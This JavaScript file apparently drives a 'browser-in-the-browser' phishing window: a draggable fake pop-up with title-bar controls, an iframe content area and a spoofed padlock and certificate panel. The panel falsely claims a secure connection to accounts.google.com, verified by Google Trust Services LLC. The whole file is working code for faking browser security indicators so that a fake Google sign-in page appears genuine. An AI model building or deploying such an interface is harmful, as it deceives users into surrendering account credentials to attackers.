var minimize = document.getElementById("minimize");
var square = document.getElementById("square");
var exit = document.getElementById("exit");
var titleBar = document.getElementById("title-bar");

////////////////// Hover listeners //////////////////
minimize.addEventListener('mouseover', function handleMouseOver() {
  minimize.style.backgroundColor = '#272727';
  minimize.style.cursor = 'context-menu';
});

minimize.addEventListener('mouseout', function handleMouseOut() {
  minimize.style.backgroundColor = 'black';
  minimize.style.cursor = 'default';
});

square.addEventListener('mouseover', function handleMouseOver() {
  square.style.backgroundColor = '#272727';
  square.style.cursor = 'context-menu';
});

square.addEventListener('mouseout', function handleMouseOut() {
  square.style.backgroundColor = 'black';
  square.style.cursor = 'default';
});

exit.addEventListener('mouseover', function handleMouseOver() {
  exit.style.backgroundColor = 'red';
  exit.style.cursor = 'context-menu';
});

exit.addEventListener('mouseout', function handleMouseOut() {
  exit.style.backgroundColor = 'black';
  exit.style.cursor = 'default';
});

titleBar.addEventListener('mouseover', function handleMouseOver() {
  titleBar.style.cursor = 'context-menu';
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});


//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:
var draggable = $('#window');
var title = $('#title-bar');

title.on('mousedown', function(e){
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
   dr.removeClass("drag");
 });
});
//////////////// Make window draggable end ////////////////


////////////////// Onclick listeners //////////////////
// X button functionality
$("#exit").click(function(){
  $("#window").css("display", "none");
});

// Maximize button functionality
$("#square").click(enlarge);

function enlarge(){
  if(square.classList.contains("enlarged")){
    $("#window").css("width", "40%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#square").removeClass("enlarged");
  }
  else{
    $("#window").css("width", "70%");
    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
    $("#content").css("width", "100%");
    $("#square").addClass("enlarged");
  }
}

// cert-specific - hover verified by
$("#ssl-padlock").hover(function(){
  if($("#verified-by").css("display") == "none") {
    setTimeout(delaypadlockinfo, 500);
  } else {
    setTimeout(delaypadlockinfo, 0);
  }
  function delaypadlockinfo() {
    if($("#verified-by").css("display") == "none"){
      $("#verified-by").css("display", "block");
    } else {
      $("#verified-by").css("display", "none");
    }
  } 
});

// cert-specific - certificate box
let box = document.getElementById('certificate-box'),
btn = document.getElementById('ssl-padlock');

btn.addEventListener('click', function (e) {
  if (box.classList.contains('hidden')) {
    box.classList.remove('hidden');
    setTimeout(function () {
      box.classList.remove('visuallyhidden');
    }, 20);
    console.log("shown with anim");
  } else {
    box.classList.add('visuallyhidden');    
    box.addEventListener('transitionend', function(e) {
      box.classList.add('hidden');
    }, {
      capture: false,
      once: true,
      passive: false
    });
    console.log("hidden with anim")
  }
  
}, false);


var highlightcolorlol = "#636363"
var normalcolorlol = "#4a4a4f"
// cert-specific - light up
$("#lightup").mouseenter(function(){
  $("#lightup").css("backgroundColor", highlightcolorlol);
  $("#spanconsec").css("backgroundColor", highlightcolorlol);
  $("#anotherpadloc").css("backgroundColor", highlightcolorlol);
  $("#arrow").css("backgroundColor", highlightcolorlol);
});
$("#lightup").mouseleave(function(){
  $("#lightup").css("backgroundColor", normalcolorlol);
  $("#spanconsec").css("backgroundColor", normalcolorlol);
  $("#anotherpadloc").css("backgroundColor", normalcolorlol);
  $("#arrow").css("backgroundColor", normalcolorlol);
});


////////////////////////////clicks outside/////////////////////
// cert-specific - clicks outside and outside iframe to hide again
document.addEventListener('click', function(event) {
  box.classList.add('visuallyhidden');    
  console.log(event.srcElement.id);

  if(event.srcElement.id=="spanconsec" || event.srcElement.id=="arrow"){
    $("#lightup").css("backgroundColor", normalcolorlol);
    $("#spanconsec").css("backgroundColor", normalcolorlol);
    $("#anotherpadloc").css("backgroundColor", normalcolorlol);
    $("#arrow").css("backgroundColor", normalcolorlol);
    box.classList.remove('hidden');
    setTimeout(function () {
      box.classList.remove('visuallyhidden');
    }, 20);
    console.log("edited and shown with anim");
    $("#certificate-box").css("height", "20%");
    $("#certificate-box").css("line-height", "35px");
    document.getElementById('siteinfocert').innerHTML="<span id='span2'><span id='arrow2'><</span><span id='consec2'>Connection security for accounts.google.com</span></span>";
    document.getElementById('spanconsec').innerHTML="<span id='yasccsit'>You are securely connected to this site. <div id='verfinal'>Verified by: Google Trust Services LLC</div></span>";
    document.getElementById('lightup').id = 'lightup2';
    document.getElementById('spanconsec').id = 'spanconsec2';
    document.getElementById('anotherpadloc').id = 'anotherpadloc2';
    $("#arrow2").mouseenter(function(){
      console.log("I ENTERED B")
      $("#arrow2").css("backgroundColor", highlightcolorlol);
    });
    $("#arrow2").mouseleave(function(){
      $("#arrow2").css("backgroundColor", normalcolorlol);
    });
    return
  } else if (event.srcElement.id=="arrow2") {
    box.classList.remove('hidden');
    setTimeout(function () {
      box.classList.remove('visuallyhidden');
    }, 20);
    console.log("edited and shown with anim");
    $("#certificate-box").css("height", "16%");
    $("#certificate-box").css("line-height", "50px");
    document.getElementById('siteinfocert').innerHTML="Site information for accounts.google.com";
    document.getElementById('spanconsec2').innerHTML="Connection secure<span id='arrow'>></span>";
    document.getElementById('lightup2').id = 'lightup';
    document.getElementById('spanconsec2').id = 'spanconsec';
    document.getElementById('anotherpadloc2').id = 'anotherpadloc';
    return
  } else if(event.srcElement.id=="siteinfocert" || event.srcElement.id=="certificate-box" || event.srcElement.id=="anotherpadloc"|| event.srcElement.id=="consec2"|| event.srcElement.id=="anotherpadloc2" || event.srcElement.id=="spanconsec2" || event.srcElement.id=="yasccsit"|| event.srcElement.id=="verfinal"){

    
    box.classList.remove('hidden');
    box.classList.remove('visuallyhidden');
    return
  }

  if( event.srcElement.id!="arrow" && event.srcElement.id!="spanconsec"){
    box.addEventListener('transitionend', function(e) {
      console.log("transend")
      console.log(e.srcElement);
      $("#certificate-box").css("height", "16%");
      $("#certificate-box").css("line-height", "50px");
      document.getElementById('siteinfocert').innerHTML="Site information for accounts.google.com";

      if(document.getElementById('spanconsec2')!=null)document.getElementById('spanconsec2').innerHTML="Connection secure<span id='arrow'>></span>";
      if(document.getElementById('lightup2')!=null)document.getElementById('lightup2').id = 'lightup';
      if(document.getElementById('spanconsec2')!=null)document.getElementById('spanconsec2').id = 'spanconsec';
      if(document.getElementById('anotherpadloc2')!=null)document.getElementById('anotherpadloc2').id = 'anotherpadloc';
      box.classList.add('hidden');
    }
    , {
      capture: false,
      once: true,
      passive: false
    });
  }
  console.log("hidden with anim");
});


//click outside but in iframe
var iframeclickbehaviourobj = {
  iframeMouseOver : false
}
window.addEventListener('blur',function(e){
  console.log(e.srcElement);

  if(iframeclickbehaviourobj.iframeMouseOver){
    console.log("transend")
    console.log(e.srcElement);
    if( event.srcElement.id!="arrow" && event.srcElement.id!="spanconsec"){
      $("#certificate-box").css("height", "16%");
      $("#certificate-box").css("line-height", "50px");
      document.getElementById('siteinfocert').innerHTML="Site information for accounts.google.com";

      if(document.getElementById('spanconsec2')!=null)document.getElementById('spanconsec2').innerHTML="Connection secure<span id='arrow'>></span>";
      if(document.getElementById('lightup2')!=null)document.getElementById('lightup2').id = 'lightup';
      if(document.getElementById('spanconsec2')!=null)document.getElementById('spanconsec2').id = 'spanconsec';
      if(document.getElementById('anotherpadloc2')!=null)document.getElementById('anotherpadloc2').id = 'anotherpadloc';
      box.classList.add('visuallyhidden'); 
      box.addEventListener('transitionend', function(e) {
        console.log(e.srcElement);
        box.classList.add('hidden');
      }, {
        capture: false,
        once: true,
        passive: false
      });
    }
  }
});

document.getElementById('content').addEventListener('mouseover',function(){
 iframeclickbehaviourobj.iframeMouseOver = true;

});
document.getElementById('content').addEventListener('mouseout',function(){
  iframeclickbehaviourobj.iframeMouseOver = false;

});

//// Pop-up appear on click with delay ////
$("#clickme").click(function(){
    $("#window").fadeIn(300);
  });